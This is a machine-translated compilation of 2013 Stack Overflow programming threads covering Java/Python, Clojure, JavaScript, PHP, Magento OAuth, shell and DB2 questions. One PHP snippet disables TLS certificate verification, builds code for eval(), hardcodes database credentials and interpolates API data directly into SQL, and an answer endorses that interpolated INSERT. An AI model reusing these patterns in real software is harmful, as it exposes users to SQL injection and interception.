我正在尝试从发送到 glassfish 服务器上的 java servlet 的 JSON 文件生成数据图。在 servlet 中，我试图调用一个 bash 脚本，该脚本调用一个 python 脚本来执行绘图。

如果我登录到服务器并从终端运行它们，bash 和 python 脚本可以正常工作，但是从 servlet 调用它们时它们不起作用。经过一些测试，我相信 matplotlib 导入是导致问题的原因。如果我从 python 脚本中删除与 matplotlib 有关的代码，它将成功运行，但使用 matplotlib 代码什么也没有发生，我也没有错误。

下面是servlet代码：

```
Runtime runtime = Runtime.getRuntime();
Process proc = runtime.exec("./test.sh "+"122333333.JSON");
try {
    proc.waitFor();
 } catch (InterruptedException ex) {
   Logger.getLogger(FileRetrieve.class.getName()).log(Level.SEVERE, null, ex);
 }

 InputStream inputstream = proc.getInputStream();
 InputStreamReader inputstreamreader = new InputStreamReader(inputstream);
 BufferedReader bufferedreader = new BufferedReader(inputstreamreader);
 String line;
 while ((line = bufferedreader.readLine()) != null) {
    out.println("\nOUTPUT = " + line);
 }
 out.print("\nbefore execute6");
 try {
   if (proc.waitFor() != 0) {
   out.println("\nexit value = " + proc.exitValue());
   } 
 } catch (InterruptedException e) {
   out.println("\nERROR = " + e);
   } 
```

下面是 bash 脚本：

```
#! /bin/bash
echo this is a test from script
echo $1
python script1.py $1
echo this is another test from script 
```

以下是python脚本的一部分：

```
import json
import matplotlib as mpl
import sys
mpl.use('Agg')
import matplotlib.pyplot as plt

filename = sys.argv[-1]
if filename.find('.')==-1:
        begin = filename[:filename.find('.')+1]
else:
        begin = filename[:filename.find('.')]

json_data=open(filename)
data = json.load(json_data)

fig = plt.figure()
ax = fig.add_subplot(111)
ax.set_xlabel('time (ns)')
ax.set_ylabel('acceleration (m/s^2)')
ax.set_title('Acceleration X')
ax.plot(data['aTime'], data['ax'], linewidth=1.0)
ax.grid(True)
fig.savefig(begin+'ax.png') 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T20:26:47.140

如果您确定它是进口的，那么我愿意打赌这个问题是进口问题。有几种简单的方法可以测试这一点。我首先想到的是，在你的 bash 脚本中，在执行脚本之前 su 进入你的用户。这似乎不是一个非常安全的永久解决方案，但它会验证它是一个模块加载问题。

# python-2.7 - Python collections.counter

> ID：15772092
> 
> 赞同：2
> 
> 时间：2013-04-02T18:53:58.077
> 
> 标签：python-2.7

python 新手，想知道如何告诉 python 第 3 行中的数据都是一个数字而不是单个数字？我正在使用 collections.Counter 但它可能不是正确的。

```
datafile.csv
Z4,29-Mar-13,Name 1,1234567
Z4,30-Mar-13,Name 1,1234567
Z4,1-Apr-13,Name 1,1234567
Z1,30-Mar-13,Name 2,1234568
Z1,1-Apr-13,Name 2,1234568
Z1,30-Mar-13,Name 3,1234569
Z2,28-Mar-13,Name 5,1234577
Z3,28-Mar-13,Name 4,1234570
Z3,29-Mar-13,Name 4,1234570
Z3,30-Mar-13,Name 4,1234570
Z3,1-Apr-13,Name 4,1234570
Z3,2-Apr-13,Name 4,1234570 
```

数据文件总计.py

```
import csv
import collections

for row in csv.reader(open('datafile.csv')):
        print collections.Counter (row[3]) 
```

这是我目前的输出：

python 数据文件总计.py

```
Counter({'1': 1, '3': 1, '2': 1, '5': 1, '4': 1, '7': 1, '6': 1})
Counter({'1': 1, '3': 1, '2': 1, '5': 1, '4': 1, '7': 1, '6': 1})
Counter({'1': 1, '3': 1, '2': 1, '5': 1, '4': 1, '7': 1, '6': 1})
Counter({'1': 1, '3': 1, '2': 1, '5': 1, '4': 1, '6': 1, '8': 1})
Counter({'1': 1, '3': 1, '2': 1, '5': 1, '4': 1, '6': 1, '8': 1})
Counter({'1': 1, '3': 1, '2': 1, '5': 1, '4': 1, '6': 1, '9': 1})
Counter({'7': 2, '1': 1, '3': 1, '2': 1, '5': 1, '4': 1})
Counter({'1': 1, '0': 1, '3': 1, '2': 1, '5': 1, '4': 1, '7': 1})
Counter({'1': 1, '0': 1, '3': 1, '2': 1, '5': 1, '4': 1, '7': 1})
Counter({'1': 1, '0': 1, '3': 1, '2': 1, '5': 1, '4': 1, '7': 1})
Counter({'1': 1, '0': 1, '3': 1, '2': 1, '5': 1, '4': 1, '7': 1})
Counter({'1': 1, '0': 1, '3': 1, '2': 1, '5': 1, '4': 1, '7': 1}) 
```

这就是我希望它看起来的样子。

```
1234567,3
1234568,2
1234569,1
1234577,1
1234570,5 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:03:40.190

我想你想要

```
>>> import csv, collections
>>> 
>>> with open("datafile.csv", "rb") as fp:
...     reader = csv.reader(fp)
...     counts = collections.Counter(row[3] for row in reader)
...     
>>> counts
Counter({'1234570': 5, '1234567': 3, '1234568': 2, '1234569': 1, '1234577': 1}) 
```

现在，您不是在制作一个`Counter`对象，而是在为每一行请求一个`Counter`对象，并且每个实例都在计算`row[3]`.

# performance - 在 lisp / clojure 中重用条件和结果中的值以提高效率

> ID：15772093
> 
> 赞同：6
> 
> 时间：2013-04-02T18:53:59.470
> 
> 标签：performance, clojure, lisp, conditional

我有一个条件，例如：

```
(cond
  (condition1) (consequent1)
  (condition2) (consequent2)) 
```

在条件 2 中说我想计算一些昂贵的值，所以我宁愿只做一次。如果 condition2 为真，那么我想在 consequent2 中使用这个昂贵的值。我的困境是我不想重新计算条件和结果中的值，因为这很浪费。我也不想将整个 cond 放入更大的 let 函数中，例如

```
(let [value-used-in-cond2 do-expensive-computation]
  (cond
  (condition1) (consequent1)
  (condition2) (consequent2))) 
```

因为如果我从未达到条件 2，即如果条件 1 为真，我不想计算这个值。

有没有一种惯用的方法来处理这个问题？首先想到的是记忆昂贵的功能，但必须有更简单的解决方案。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-02T21:10:30.713

在*On Lisp*中，Paul Graham 描述了 Common Lisp 条件的照应变体的宏，它们将符号 'it 绑定到条件表达式的值。这些宏遵循与正常条件形式相同的评估语义，因此从您的示例中，`condition2`将在`condition1`且仅当`condition1`为假时才评估。所有条件将最多评估一次。您可以在[http://www.paulgraham.com/onlisptext.html](http://www.paulgraham.com/onlisptext.html)下载*On Lisp*，照应宏的代码在第 191 页的图 14.1 中。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-02T19:36:13.483

一个应该在 Clojure 中工作的有点丑陋的解决方案是

```
(let [expensive-result (or (condition1) (do-expensive-computation)] 
   (cond (condition1) (consequent1)
         (condition2) (consequent2))) 
```

然而，这需要对 condition1 进行两次评估。

假设标题中的 lisp / clojure 表示 Clojure*或（另一个） lisp*，在 Common Lisp 中你可以这样做

```
(let (var)
   (cond
      ((condition1) (consequent1))
      ((setq var (condition2)) (consequent2)))) 
```

但这在 Clojure 中不起作用，因为局部变量是不可变的。

您可以使用原子来完成与 Clojure 类似的事情。

```
(let [v (atom nil)]
  (cond
    (condition1) (consequent1)
    (do (reset! v (expensive)) (condition2 @v)) (consequent2 @v))) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-03T06:34:07.123

使用 a`delay`最多计算一次并使用它零次或多次：

```
(let [expensive-thing (delay do-expensive-computation)]
  (cond (condition1) (consequent1)
        (condition2 @expensive-thing) (consequent2 @expensive-thing))) 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-02T22:07:24.730

在 Clojure 中重写它以避免重复计算的一种方法是：

```
(or
  (when (condition1) (consequent1))
  (when-let [val2 (condition2)] (consequent2 val2))) 
```

这在假设`consequent1`并且`consequent2`永远不会返回的情况下起作用`nil`- 否则对 的评估`or`将落入下一个形式。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-12-08T15:28:41.920

I had a similar problem, but I only have two case condition so I used a combination of a function and the if-let macro so:

```
(defn- expensive-computation
  [a b]
  (if (test (compute a b)) a nil))

(if-let [foo (expensive-computation a b)]
  (consequent2 foo)
  (consequent1)) 
```

As you can see the value is only computed once, after that a simple comparison is done to check if the test of the computation was sucessfull or not. If the test was not sucessful then it return nil, thus executing consequent1. It is not a super clean solution but it was the best that I found. Hope it helps

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-12-08T17:29:42.393

如果条件 2 使用了一个昂贵的值，但条件 2 是假的，我假设它的形式是

```
(and (expensive-calculation) (other-extra-condition)) 
```

在这些情况下，我所做的是：

```
(let (expensive-value)
  (cond (condition1 consequent1)
        (and (setq expensive-value (expensive-calculation)) (other-extra-condition)) consequent2)
        ((and expensive-value (other-extra-condition2)) consequent3) 
```

# javascript - 在javascript中创建带有时区的当前时间列表

> ID：15772097
> 
> 赞同：2
> 
> 时间：2013-04-02T18:54:11.363
> 
> 标签：javascript

如何在 javascript 中创建此列表：

它从-11到+14。

![在此处输入图像描述](https://i.stack.imgur.com/s25SW.png)

```
var now = new Date(); 
```

给我这个： *2013 年 4 月 2 日星期二 20:48:11 GMT+0200（中欧夏令时间）*

2013 年 4 月 2 日星期二 20:48:11 GMT+0200 就足够了，但使用完整的日名会更好。然后我仍然需要创建一个列表。我可以在 javascript 中创建一个选择选项，例如

```
var time = document.getElementById('time'); 
time.options[time.options.length] = new Option(value, text); 
time.options[time.options.length] = new Option(value, text); 
```

所以我现在是其中的一部分，但不能把整个事情放在一起。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:48:49.017

使用非 UTC 方法时，您无法更改输出日期的本地时区，因此我们需要作弊。相反，我们将创建不同的日期（以 UTC 为单位）并假装它们在我们想要枚举的时区中：

```
var options = [],
    dayNames = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"],
    monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];

for (var i=-11; i<=14; i++) {
    var d = new Date(); // now
    d.setUTCHours(d.getUTCHours() + i); // translate

    // format:
    var na = dayNames[d.getUTCDay()],
        mo = monthNames[d.getUTCMonth()],
        da = d.getUTCDate(),
        ye = d.getUTCFullYear(),
        ho = ("0"+d.getUTCHours()).slice(-2),
        mi = ("0"+d.getUTCMinutes()).slice(-2),
        of = (i<0?"-":"+")+("0"+Math.abs(i)+"00").slice(-4);
    var text = na+", "+mo+" "+da+", "+ye+" - "+ho+":"+mi+" "+of;
    options.push(new Option(i, text));
} 
```

# php - 以某种方式存储 API 数据数组

> ID：15772098
> 
> 赞同：0
> 
> 时间：2013-04-02T18:54:13.190
> 
> 标签：php, mysql, xml

我已经想出了如何将我的数据数组插入到 mysql 表中。（谢谢猎人）。我想知道是否有更简洁的代码可以完成我正在做的事情。我注意到我这样做的方式只让我插入顶级数组结果。数组显示正确，但无法获得具有相同名称的子级别节点。有什么建议吗？也想为任何有类似问题的人发帖。我花了一些时间才找到你们。

```
<?php
function upsTrack($trackingNumber) {
$data ="<?xml version=\"1.0\"?>
    <AccessRequest xml:lang='en-US'>
            <AccessLicenseNumber>AccessNumber</AccessLicenseNumber>
            <UserId>username</UserId>
            <Password>Password</Password>
    </AccessRequest>
    <?xml version=\"1.0\"?>
    <TrackRequest>
            <Request>
                    <TransactionReference>
                            <CustomerContext>
                                    <InternalKey>blah</InternalKey>
                            </CustomerContext>
                            <XpciVersion>1.0</XpciVersion>
                    </TransactionReference>
                    <RequestAction>Track</RequestAction>
            </Request>
    <TrackingNumber>$trackingNumber</TrackingNumber>    
    </TrackRequest>";
$ch = curl_init("https://www.ups.com/ups.app/xml/Track");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_TIMEOUT, 60);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
$result=curl_exec ($ch);
// echo '<!-- '. $result. ' -->';
$data = strstr($result, '<?');
$xml_parser = xml_parser_create();
xml_parse_into_struct($xml_parser, $data, $vals, $index);
xml_parser_free($xml_parser);
$params = array();
$level = array();
foreach ($vals as $xml_elem) {
if ($xml_elem['type'] == 'open') {
if (array_key_exists('attributes',$xml_elem)) {
     list($level[$xml_elem['level']],$extra) = array_values($xml_elem['attributes']);
} else {
     $level[$xml_elem['level']] = $xml_elem['tag'];
}
}
if ($xml_elem['type'] == 'complete') {
$start_level = 5;
$php_stmt = '$params';
while($start_level < $xml_elem['level']) {
     $php_stmt .= '[$level['.$start_level.']]';
     $start_level++;
}
$php_stmt .= '[$xml_elem[\'tag\']] = $xml_elem[\'value\'];';
eval($php_stmt);
}
}
curl_close($ch);
return $params;
}

if ($_POST['af0'] == 'xx1') {
if (preg_match('/^[a-z\d_]{4,80}$/i', $_POST['trackingNumber'])) {
    $cleanTrackingNumber = $_POST['trackingNumber'];
    $someArray = upsTrack("$cleanTrackingNumber");
    echo $someArray['RESPONSESTATUSDESCRIPTION'],    $someArray['SHIPPERNUMBER'],  $someArray['ADDRESSLINE1'],$someArray['CITY'],  $someArray['STATEPROVINCECODE'], $someArray['POSTALCODE'], $someArray['COUNTRYCODE'],$someArray['CODE'], $someArray['DESCRIPTION'], $someArray['VALUE'], $someArray['SHIPMENTIDENTIFICATIONNUMBER'], $someArray['PICKUPDATE'], $someArray['TRACKINGNUMBER'], $someArray['ACTIVITYLOCATION']['ADDRESS'] ['STATEPROVINCECODE'], $someArray['DATE'], $someArray['TIME'], $someArray['WEIGHT'];
} else {
    echo 'Invalid tracking number... sigh...';
}
}

?>
<?php
/*** mysql hostname ***/
$hostname = 'localhost';

/*** mysql username ***/
$username = 'testdb';

/*** mysql password ***/
$password = 'test123';

/*** database name ***/
$dbname = 'test';

try {
$dbh = new PDO("mysql:host=$hostname;dbname=$dbname", $username, $password);
/*** echo a message saying we have connected ***/
echo 'Connected to database<br />';

/*** set the PDO error mode to exception ***/
$dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
/*** begin the transaction ***/
$dbh->beginTransaction();

/***  INSERT statements ***/
$dbh->exec("INSERT INTO upstrackdb ( RESPONSESTATUSDESCRIPTION, SHIPPERNUMBER,   ADDRESSLINE1, CITY, STATEPROVINCECODE, POSTALCODE, COUNTRYCODE, CODE, DESCRIPTION, VALUE, SHIPMENTIDENTIFICATIONNUMBER, PICKUPDATE, TRACKINGNUMBER, ACTIVITYLOCATION, DELIVERYDATE, DELIVERYTIME, WEIGHT) VALUES ( '$someArray[RESPONSESTATUSDESCRIPTION]',  '$someArray[SHIPPERNUMBER]', '$someArray[ADDRESSLINE1]', '$someArray[CITY]', '$someArray[STATEPROVINCECODE]', '$someArray[POSTALCODE]', '$someArray[COUNTRYCODE]', '$someArray[CODE]', '$someArray[DESCRIPTION]', '$someArray[VALUE]', '$someArray[SHIPMENTIDENTIFICATIONNUMBER]', '$someArray[PICKUPDATE]', '$someArray[TRACKINGNUMBER]', '$someArray[STATEPROVINCECODE]',  '$someArray[DATE]', '$someArray[TIME]', '$someArray[WEIGHT]')");

/*** commit the transaction ***/
$dbh->commit();

/*** echo a message to say the database was created ***/
echo 'Data entered successfully<br />';
}
catch(PDOException $e)
{
/*** roll back the transaction if we fail ***/
$dbh->rollback();

/*** echo the sql statement and error message ***/
echo $sql . '<br />' . $e->getMessage();
}
?> 
```

以下是我得到的结果。

```
<!-- HTTP/1.1 200 OK
Date: Tue, 02 Apr 2013 19:16:15 GMT
Server: Apache
Pragma: no-cache
Content-Length: 1808
Vary: User-Agent
Content-Type: application/xml

<?xml version="1.0"?>
<TrackResponse><Response><TransactionReference<XpciVersion>1.0</XpciVersion>         </TransactionReference> <ResponseStatusCode>1</ResponseStatusCode>  <ResponseStatusDescription>Success</ResponseStatusDescription></Response><Shipment> <Shipper><ShipperNumber>975522</ShipperNumber><Address><AddressLine1>1700 SUNFLOWER AVE</AddressLine1><City>COSTA MESA</City><StateProvinceCode>CA</StateProvinceCode><PostalCode>92626   1505</PostalCode><CountryCode>US</CountryCode></Address></Shipper><ShipTo><Address><City>MOUNTAINSIDE</City><StateProvinceCode>NJ</StateProvinceCode><PostalCode>07092</PostalCode><CountryCode>US</CountryCode></Address></ShipTo><Service><Code>002</Code><Description>2ND DAY AIR</Description></Service><ReferenceNumber><Code>01</Code><Value>365357</Value></ReferenceNumber><ReferenceNumber><Code>01</Code><Value>4500137238</Value></ReferenceNumber><ShipmentIdentificationNumber>1Z9755220249869083</ShipmentIdentificationNumber><PickupDate>20130213</PickupDate><Package><TrackingNumber>1Z9755220249869083</TrackingNumber><Activity><ActivityLocation><Address><City>MOUNTAINSIDE</City><StateProvinceCode>NJ</StateProvinceCode><PostalCode>07092</PostalCode><CountryCode>US</CountryCode></Address><Code>M5</Code><Description>MAIL ROOM</Description><SignedForByName>SALEMI</SignedForByName></ActivityLocation><Status><StatusType><Code>D</Code><Description>DELIVERED</Description></StatusType><StatusCode><Code>KB</Code></StatusCode></Status><Date>20130215</Date><Time>093400</Time></Activity><PackageWeight><UnitOfMeasurement><Code>LBS</Code></UnitOfMeasurement><Weight>27.00</Weight></PackageWeight><ReferenceNumber><Code>01</Code><Value>365357</Value></ReferenceNumber><ReferenceNumber><Code>01</Code><Value>4500137238</Value></ReferenceNumber></Package></Shipment></TrackResponse>     --><pre>Array
(
[XPCIVERSION] => 1.0
[RESPONSESTATUSCODE] => 1
[RESPONSESTATUSDESCRIPTION] => Success
[SHIPPERNUMBER] => 975522
[ADDRESSLINE1] => 1700 SUNFLOWER AVE
[CITY] => MOUNTAINSIDE
[STATEPROVINCECODE] => NJ
[POSTALCODE] => 07092
[COUNTRYCODE] => US
[CODE] => 01
[DESCRIPTION] => 2ND DAY AIR
[VALUE] => 4500137238
[SHIPMENTIDENTIFICATIONNUMBER] => 1Z9755220249869083
[PICKUPDATE] => 20130213
[TRACKINGNUMBER] => 1Z9755220249869083
[ACTIVITYLOCATION] => Array
    (
        [ADDRESS] => Array
            (
                [CITY] => MOUNTAINSIDE
                [STATEPROVINCECODE] => NJ
                [POSTALCODE] => 07092
                [COUNTRYCODE] => US
            )

        [CODE] => M5
        [DESCRIPTION] => MAIL ROOM
        [SIGNEDFORBYNAME] => SALEMI
    )

[STATUS] => Array
    (
        [STATUSTYPE] => Array
            (
                [CODE] => D
                [DESCRIPTION] => DELIVERED
            )

        [STATUSCODE] => Array
            (
                [CODE] => KB
            )

    )

[DATE] => 20130215
[TIME] => 093400
[UNITOFMEASUREMENT] => Array
    (
        [CODE] => LBS
    )

[WEIGHT] => 27.00
) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:09:29.097

听起来您拥有所需的一切。解析结果，读入电子邮件地址列表，然后将它们插入数据库（首先仔细检查重复项）。

该数组看起来很容易访问。它只是一个简单的`"INSERT INTO ... VALUES( $array['DATE'], $array['TIME'] ...)"`

这是 PHP 中 PDO 的一个很好的介绍：[http ://www.phpro.org/tutorials/Introduction-to-PHP-PDO.html#7.1](http://www.phpro.org/tutorials/Introduction-to-PHP-PDO.html#7.1)

# api - 401 错误“oauth_problem=nonce_used”将产品添加到 Magento w/Rest API

> ID：15772102
> 
> 赞同：10
> 
> 时间：2013-04-02T18:54:19.520
> 
> 标签：api, magento, rest, oauth

尝试使用 rest api 将产品添加到 Magento 时，使用“oauth_problem=nonce_used”消息返回 401 状态。奇怪的是，这些产品仍然是进口的，但这真的让我失望，因为我没有得到产品 ID 来更新库存信息。

Magento 安装是全新的（crucialwebhost 安装程序）1.7.0.2，我使用的代码几乎是从 magento 网站复制和粘贴的......

```
$callbackUrl = '****';
$temporaryCredentialsRequestUrl = "*****/oauth/initiate?oauth_callback=".urlencode($callbackUrl);
$adminAuthorizationUrl = '*****/admin/oauth_authorize';
$accessTokenRequestUrl = '*****/oauth/token';
$apiUrl = '*****/api/rest';

$consumerKey = '*****';
$consumerSecret = '******';

try
{
$authType = ($_SESSION['state'] == 2) ? OAUTH_AUTH_TYPE_AUTHORIZATION : OAUTH_AUTH_TYPE_URI;
$oauthClient = new OAuth($consumerKey, $consumerSecret, OAUTH_SIG_METHOD_HMACSHA1, $authType);
$oauthClient->enableDebug();

if(!isset($_GET['oauth_token']) && !$_SESSION['state'])
{
  $requestToken = $oauthClient->getRequestToken($temporaryCredentialsRequestUrl);
  $_SESSION['secret'] = $requestToken['oauth_token_secret'];
  $_SESSION['state'] = 1;
  header('Location: '.$adminAuthorizationUrl.'?oauth_token='.$requestToken['oauth_token']);
  exit;
} else if($_SESSION['state'] == 1)
{
  $oauthClient->setToken($_GET['oauth_token'], $_SESSION['secret']);
  $accessToken = $oauthClient->getAccessToken($accessTokenRequestUrl);
  $_SESSION['state'] = 2;
  $_SESSION['token'] = $accessToken['oauth_token'];
  $_SESSION['secret'] = $accessToken['oauth_token_secret'];
  header('Location: '.$callbackUrl);
  exit;
} else
{
  $oauthClient->setToken($_SESSION['token'], $_SESSION['secret']);
  $resourceUrl = "$apiUrl/products";

  $productData = json_encode(array(
'type_id' => 'simple',
    'attribute_set_id' => 4,
    'sku' => $local_product['sku'],
    'weight' => 1,
    'status' => 1,
'visibility' => 4,
    'name' => $local_product['name'],
    'description' => $local_product['description'],
    'short_description' => $local_product['description'],
    'price' => $local_product['price'],
    'tax_class_id' => 0,
  ));
  $headers = array('Content-Type' => 'application/json');
  $oauthClient->fetch($resourceUrl, $productData, OAUTH_HTTP_METHOD_POST, $headers);
  $respHeader = $oauthClient->getLastResponseHeaders();

}

} catch(OAuthException $e)
{
  print_r($e);
}
}

session_destroy(); 
```

确切错误：{"messages":{"error":[{"code":401,"message":"oauth_problem=nonce_used"}]}}

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2014-05-28T20:38:17.097

在 Mage_Api2_Model_Resource 中，大约第 227 行，找到

```
$this->getResponse()->setHeader('Location', $newItemLocation); 
```

并在此之后插入：

```
 $this->getResponse()->setHttpResponseCode(202); 
```

参考：维基百科“HTTP 位置”：

> 在两种情况下，HTTP 服务器的响应中会返回 HTTP Location 标头字段：
> 
> 1.  要求网络浏览器加载不同的网页。在这种情况下，Location 标头应该与 3xx 的 HTTP 状态代码一起发送。
> 2.  提供有关新创建资源的位置的信息。在这种情况下，Location 标头应该使用 201 或 202 的 HTTP 状态码发送

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-08T22:39:32.760

我遇到了完全相同的问题，并花了数周时间追踪问题。这似乎是 Apache 与 PHP 和 Rewriting 的奇怪组合。最后我创建了一个干净的安装，问题就消失了。我还尝试创建第二个安装，可以观察到问题但失败 - 错误仅出现在我的生产系统中，而不出现在任何测试安装中......

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-04-22T00:04:18.783

我查看了这个，从我在代码中看到的内容来看，它看起来像 OAuth 注册了你的所有调用，如果它发现实际上使用了完全相同的**随机数，并且****时间戳**与之前的调用完全相同，它只会丢弃它这个非常具体**的 oauth_problem=nonce_used**错误。

代码来自`app/code/core/Mage/Oauth/Model/Server.php`

```
/**
 * Validate nonce request data
 *
 * @param string $nonce Nonce string
 * @param string|int $timestamp UNIX Timestamp
 */
protected function _validateNonce($nonce, $timestamp)
{
    $timestamp = (int) $timestamp;

    if ($timestamp <= 0 || $timestamp > (time() + self::TIME_DEVIATION)) {
        $this->_throwException('', self::ERR_TIMESTAMP_REFUSED);
    }
    /** @var $nonceObj Mage_Oauth_Model_Nonce */
    $nonceObj = Mage::getModel('oauth/nonce');

    $nonceObj->load($nonce, 'nonce');

    if ($nonceObj->getTimestamp() == $timestamp) {
        $this->_throwException('', self::ERR_NONCE_USED);
    }
    $nonceObj->setNonce($nonce)
        ->setTimestamp($timestamp)
        ->save();
} 
```

所以我想说，当你在 REST 中通过 Magento API 进行调用时，你应该特别注意你发出的每个请求都有自己独特的生成的组合时间戳/随机值。

另见

> oauth_nonce。由应用程序唯一生成的随机值。
> oauth_timestamp。一个正整数，以自 1970 年 1 月 1 日 00:00:00 GMT 以来的秒数表示。

和

> nonce_used：nonce-timestamp 组合已被使用。

从这个来源：[http ://devdocs.magento.com/guides/v2.0/get-started/authentication/gs-authentication-oauth.html](http://devdocs.magento.com/guides/v2.0/get-started/authentication/gs-authentication-oauth.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-08-11T09:09:45.500

我遇到了完全相同的问题，为了解决它，我查看了 mod_rewrite apache 模块并打开了该模块的日志记录，这是通过将其添加到您的 apache httpd.conf 文件来完成的（这是针对 apache 2.4x 的，需要 2.2x做的不同

```
<IfModule mod_rewrite.c>
   LogLevel mod_rewrite.c:trace8
</IfModule> 
```

然后将错误记录到 apache 标准 error_log 当我查看 rewrite here 时，我可以看到我的 post 请求被重写了两次，第一次将产品添加到 magento，第二次再次添加产品失败显然，因为使用了随机数。

我可以看到在 .htaccess 中导致这种情况的重写规则是

```
## workaround for HTTP authorization
## in CGI environment

  RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}] 
```

我检查了我的配置，我确实在运行快速 cgi php，我通过检查 php 信息脚本中的服务器 API 的值来检查这一点。我花了很长时间试图解决这个问题，以至于我知道根本原因我只是将 PHP 从 CGI php 更改为 apache 模块，嘿，现在我的 post 请求只重写一次并返回所有难以捉摸的 200 响应代码。

* * *

## 回答 #5

> 赞同：-4
> 
> 时间：2013-04-17T17:40:22.940

解决方法：

使用 SOAP API。

之前没用过的原因：

SOAP API 不提供自定义产品属性或产品数量增量字段的功能。

使固定：

使用 SOAP api 将您想要的任何字段添加到产品中，首先像这样为它们创建一个对象数组（下面的最后 4 行代码为添加的每个字段重复）：

```
$additionalAttrs = array();

$per_item = new stdClass();
$per_item->key = 'price_per_item';
$per_item->value = $local_product['price'];
$additionalAttrs['single_data'][] = $per_item; 
```

然后使用键“additional_attributes”将其添加到您的产品数组中，例如：

```
'additional_attributes' => $additionalAttrs, 
```

我知道这项工作只能帮助那些出于同样原因而避免使用 SOAP API 的人，但希望它对你们中的一些人有所帮助。我们看到它尝试添加产品两次的错误似乎是特定于服务器配置的，并且很难追踪。

# linux - 如果在检查两个字符串时在 shell 脚本中给出错误条件

> ID：15772107
> 
> 赞同：0
> 
> 时间：2013-04-02T18:54:31.213
> 
> 标签：linux, shell

在下面的 shell 脚本中，我想根据文件类型执行两个不同的任务，但它给出了一个错误：`"[==c]: command not found"`

```
echo "enter file name"
read num
var_check= echo $str |awk -F . '{if (NF>1) {print $NF}}'

if ["$var_check"=="c"];then
    echo "Some task for c"
elif ["$var_check"=="cpp"];then
    echo "Some task for cpp"
else
    echo "Wrong file extension"
fi 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T18:56:41.617

你写了：

```
if ["$var_check"=="c"];then 
```

命令是`[`命令；它的名称必须用空格包围（简单地说）。

```
if [ "$var_check" == "c" ]; then 
```

最后一个参数 ,`]`之前也必须有一个空格。其中的操作数也必须用空格分隔；它们需要是单独的论点。运算符的规则`[[ ... ]]`有点不同，但使用空格可以帮助人们阅读代码。你写的有点像期待：

```
ls"-l"/dev/tty 
```

去工作; 它不会。

您还需要仔细检查您的`test`or`[`运营商是否支持`==`; 正常形式是`=`.

* * *

该行：

```
var_check= echo $str |awk -F . '{if (NF>1) {print $NF}}' 
```

这将使用set 作为环境变量运行`echo`命令，这不太可能是您想要的。`var_check`你几乎肯定打算写：

```
var_check=$(echo $str |awk -F . '{if (NF>1) {print $NF}}') 
```

这将运行`echo`and`awk`命令并捕获`var_check`. 优先使用`$(...)`符号，而不是使用较旧但更复杂的``...``符号。在简单的情况下，它们看起来是一样的；当您嵌套它们时，`$(...)`符号非常容易理解和使用。

此外，在更大的范围内（3 行而不是 1 行）：

```
echo "enter file name"
read num
var_check=$(echo $str |awk -F . '{if (NF>1) {print $NF}}') 
```

您将文件名读入变量`num`；然后你 echo`$str`而不是`$num`. 如果您已经`$str`在脚本中的某个位置（在未显示的代码中）进行了设置，那么您所拥有的可能没问题。作为一个独立的片段，这是不对的。

您还可以简化`awk`一点：

```
var_check=$(echo $str |awk -F . 'NF > 1 {print $NF}') 
```

这将与您编写的内容相同，但使用较少的括号和大括号。

# install4j - Install4j setOwnerAction 似乎不适用于符号链接

> ID：15772112
> 
> 赞同：0
> 
> 时间：2013-04-02T18:55:04.460
> 
> 标签：install4j, owner

我正在尝试使用 install4j 中的“setOwnerAction”来设置目录内容的所有者：组。“递归”复选框被选中。当目录不是符号链接时它工作正常，但是当我提供的目录*是*符号链接时，该操作似乎没有做任何事情。但是，日志表明成功。

我相信（通过阅读手册页）默认情况下，“chown”不会在没有传递特定选项（“-RH”）的情况下递归到符号链接中，但是无法在 gui 中指示该选项以执行操作。我显然不知道“setOwnerAction”是否使用“chown”，所以我不确定这是否相关，但这是一个想法......

任何想法表示赞赏...

# sql - UNION 在子查询中抛出数字

> ID：15772114
> 
> 赞同：0
> 
> 时间：2013-04-02T18:55:16.510
> 
> 标签：sql, db2, subquery, union

我正在开发一个登陆页面的项目。基本上，用户可以选择多个标准，这些标准将在 DB2 数据库上运行查询并返回结果。查询被分解为根据用户标准和插入的参数组装的各个部分。虽然我在处理一些从更大的表和连接中提取的巨大数据集时遇到了一些困难，但当我在数据库上运行一些性能数据时，有一个异常突出。

所有这些完全组装的查询的一个共同点是，它们在使用 id 列表中进行过滤。大约有六个这样的查询返回不同大小的数据集。它们中的大多数都非常简单，即：

```
TABLE.COLUMN IN (subquery with a few joins that returns a column of user ids) 
```

这些子查询需要很长时间才能自行运行。但是，其中之一需要联合。本质上，一个表包含一个键，该键必须用于从两个不同的表中收集用户 ID，因此必须合并两组用户 ID 以获得子查询的单个列表，即：

```
TABLE.COLUMN IN (subquery UNION subquery) 
```

我猜 DB2 优化器在处理带有联合的子查询时会遇到更多的限制，而不是使用一系列简单的连接，并且无法处理它。当涉及到它收集的数据量时，这个特定的子查询是中间的，所以它不是一个巨大的数据集的问题。

